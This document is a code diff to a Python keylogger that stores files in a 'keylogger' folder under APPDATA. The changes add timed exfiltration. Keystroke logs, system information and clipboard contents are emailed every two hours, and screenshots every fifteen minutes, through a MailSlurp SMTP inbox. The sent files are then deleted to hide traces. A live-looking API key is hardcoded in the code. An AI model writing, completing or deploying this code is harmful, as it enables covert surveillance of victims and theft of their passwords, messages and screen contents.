@@ -45,7 +45,6 @@ system_information= "systeminfo.txt"
 screenshot_information= "screenshot.png"
 clipboard_information = "clipboard.txt"
 
-#file_path to be changed to C:\Users\Geek\AppData\Roaming
 file_path = os.getenv('APPDATA')
 try:
     os.mkdir(file_path + '\\keylogger')
@@ -177,23 +176,50 @@ def on_release(key):
 with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
-def send_email():
 # create a mailslurp configuration
-    configuration = mailslurp_client.Configuration()
-    configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
-    with mailslurp_client.ApiClient(configuration) as api_client:
+configuration = mailslurp_client.Configuration()
+configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
+with mailslurp_client.ApiClient(configuration) as api_client:
     # create an inbox
-        inbox_controller = mailslurp_client.InboxControllerApi(api_client)
-        options = mailslurp_client.CreateInboxDto()
-        options.name = "data"
-        options.inbox_type="SMTP_INBOX"
-        inbox = inbox_controller.create_inbox_with_options(options)
-        #print("email address is " + inbox.email_address)
+    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
+    options = mailslurp_client.CreateInboxDto()
+    options.name = "data"
+    options.inbox_type="SMTP_INBOX"
+    inbox = inbox_controller.create_inbox_with_options(options)
+    #print("email address is " + inbox.email_address)
     
-    access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
-    with open("log.txt", 'rb') as f: #need to change log.txt to actual path
-        file_data=f.read() 
-        file_name=f.name
+access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
+
+def send_log():
+    with open(file_path+ '\\keylogger'+'\\key_log.txt', 'rb') as f1,open(file_path+ '\\keylogger'+'\\systeminfo.txt', 'rb') as f2,open(file_path+ '\\keylogger'+'\\clipboard.txt', 'rb') as f3:
+        file1_data=f1.read() 
+        file1_name=f1.name()
+        file2_data=f2.read() 
+        file2_name=f2.name()
+        file3_data=f3.read() 
+        file3_name=f3.name()
+    #print(access_details)
+    #print("sending")
+    with SMTP(
+        host=access_details.smtp_server_host,
+        port= access_details.smtp_server_port,
+    ) as smtp:
+        msg= EmailMessage()
+        msg.add_attachment(file1_data, maintype='text', subtype='plain',filename=file1_name)
+        msg.add_attachment(file2_data, maintype='text', subtype='plain',filename=file2_name)
+        msg.add_attachment(file3_data, maintype='text', subtype='plain',filename=file3_name)
+        smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
+        smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
+        smtp.quit()
+    #print("check your mail :)")
+    os.remove(file_path+ '\\keylogger'+'\\key_log.txt')
+    os.remove(file_path+ '\\keylogger'+'\\clipboard.txt')
+    os.remove(file_path+ '\\keylogger'+'\\systeminfo.txt') #deletes files
+
+def send_img():
+    with open(file_path+ '\\keylogger'+'\\screenshot.png', 'rb') as f4:
+        file_data=f4.read() 
+        file_name=f4.name
     
     #print(access_details)
     #print("sending")
@@ -202,14 +228,16 @@ def send_email():
         port= access_details.smtp_server_port,
     ) as smtp:
         msg= EmailMessage()
-        msg.add_attachment(file_data, maintype='text', subtype='plain',filename=file_name)
+        msg.add_attachment(file_data, maintype='image', subtype='png',filename=file_name)
         smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     #print("check your mail :)")
+    os.remove(file_path+ '\\keylogger'+'\\screenshot.png') #deletes png file
 
 
 #defining time interval for sending the data
-t = Timer(900.0, send_email) #900 seconds,ie 15 mins, can be changed 
-t.start()
-
+tlog = Timer(7200.0, send_log) #7200sec, 2hr
+timg= Timer(900,send_img) #900 seconds,ie 15 mins, can be changed 
+tlog.start()
+timg.start()
